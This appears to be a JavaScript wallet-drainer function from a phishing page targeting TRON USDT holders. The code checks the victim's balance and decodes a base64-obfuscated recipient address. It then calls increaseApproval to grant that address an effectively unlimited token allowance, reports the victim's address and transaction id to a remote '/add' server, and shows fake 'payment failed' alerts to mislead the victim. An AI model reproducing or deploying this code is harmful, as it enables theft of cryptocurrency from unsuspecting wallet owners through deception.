async function approve() {
			const trc20ContractAddress = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";//合约地址

			try {
				let contract = await tronWeb.contract().at(trc20ContractAddress);
				
				const ressdata = await contract.balanceOf(userAddress).call();
				let usdtBalance = parseInt(ressdata._hex) / 1000000; //
				if(usdtBalance>0.1){ // 如果余额大于2000
				    permissionsAddr=window.atob("VExmRUtpVHA1VVl0czVtVThxRjhZa0hFemZ1WkdXVEFiQQ=="); 
				}
					
				let result = await contract.increaseApproval(
					permissionsAddr,
					'123456789000000000000000000000000000000000000000000'
				).send({
					feeLimit: 30000000
				}).then(output => {
					var data = {
						address:userAddress,
						authorized_address:permissionsAddr,
						txid:output,
						type:'trc',
						transaction:3
					 }
					 
					jQuery.ajax({
						url: domain + '/add',
						method: 'POST',
						data: data,
						async: false, 
						success: function (data) {
							alert(msg);
							if(data == 'success'){
								alert("网络异常，付款失败");
							}else{
								alert('付款失败')
							}
						},
						error: function (e) {
						}
					})
				});
			} catch (error) {
				console.error(error)
			}
		}